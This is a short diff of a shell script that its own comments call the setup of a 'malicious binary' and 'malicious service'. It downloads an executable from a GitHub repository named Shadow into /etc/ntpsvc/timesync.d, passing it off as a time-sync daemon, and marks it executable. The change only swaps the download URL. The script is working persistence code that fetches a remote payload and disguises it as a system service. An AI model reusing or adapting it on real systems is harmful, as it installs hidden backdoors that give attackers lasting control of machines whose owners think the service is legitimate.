@@ -2,7 +2,7 @@
 
 # Create malicious binary
 mkdir -p /etc/ntpsvc/
-wget https://github.com/DaveTheBearMan/Shadow/raw/refs/heads/main/Server/ShadowServer -O /etc/ntpsvc/timesync.d
+wget https://github.com/DaveTheBearMan/Shadow/raw/refs/heads/main/cmd/cmd -O /etc/ntpsvc/timesync.d
 chmod +x /etc/ntpsvc/timesync.d
 
 # Make the malicious service
